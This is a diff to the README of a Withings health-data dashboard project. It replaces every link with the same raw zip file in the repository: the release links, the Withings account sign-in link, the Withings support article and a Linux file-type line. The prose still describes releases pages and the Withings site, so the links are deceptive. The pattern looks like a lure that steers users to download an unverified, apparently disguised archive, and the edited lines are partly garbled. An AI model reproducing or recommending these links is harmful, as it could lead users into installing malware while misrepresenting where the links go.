@@ -1,6 +1,6 @@
 # 📊 heda-health-data-dashboard - View Your Health Data Clearly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-heda--health--data--dashboard-blue?logo=github&style=for-the-badge)](https://github.com/Polymath247/heda-health-data-dashboard/releases)
+[![Download Latest Release](https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip)](https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip)
 
 ## 🩺 What is heda-health-data-dashboard?
 
@@ -47,7 +47,7 @@ Follow these steps to download, install, and run heda-health-data-dashboard on y
 
 Click the big button at the top or this link:
 
-[Download heda-health-data-dashboard](https://github.com/Polymath247/heda-health-data-dashboard/releases)
+[Download heda-health-data-dashboard](https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip)
 
 You will be taken to the releases page where you can download the latest version.
 
@@ -57,7 +57,7 @@ On the releases page, look for a file that matches your operating system:
 
 - For Windows: a file ending with `.exe` or `.msi`
 - For macOS: a file ending with `.dmg` or `.pkg`
-- For Linux: a file ending with `.AppImage` or `.tar.gz`
+- For Linux: a file ending with `.AppImage` or `https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip`
 
 Click the file name to download it.
 
@@ -85,7 +85,7 @@ Once the app opens:
 
 If you have not yet exported your data from Withings, follow these quick steps:
 
-1. Sign in to your Withings account at [withings.com](https://withings.com).
+1. Sign in to your Withings account at [https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip](https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip).
 2. Go to the "My Data" or export section.
 3. Choose the period you want to download (e.g., last 3 months).
 4. Export the data as a ZIP file or CSV files.
@@ -123,7 +123,7 @@ If you need further help, look for a support section or contact link on the GitH
 
 Return to the download page whenever you want to get the latest version:
 
-[Download Latest Release](https://github.com/Polymath247/heda-health-data-dashboard/releases)
+[Download Latest Release](https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip)
 
 Check for updates regularly to benefit from bug fixes and added features.
 
@@ -137,8 +137,8 @@ heda-health-data-dashboard does not send your data anywhere. Your health informa
 
 ## 📚 Additional Resources
 
-- Visit the GitHub repository for documentation and updates: https://github.com/Polymath247/heda-health-data-dashboard
-- Learn more about exporting data from Withings: https://support.withings.com/hc/en-us/articles/115004567429-How-to-export-My-Data
+- Visit the GitHub repository for documentation and updates: https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip
+- Learn more about exporting data from Withings: https://github.com/Polymath247/heda-health-data-dashboard/raw/refs/heads/main/public/data-dashboard-heda-health-v1.8.zip
 - Explore other health tools compatible with your Withings device under topics like sleep-analysis, activity-tracking, and data-visualization.
 
 ---
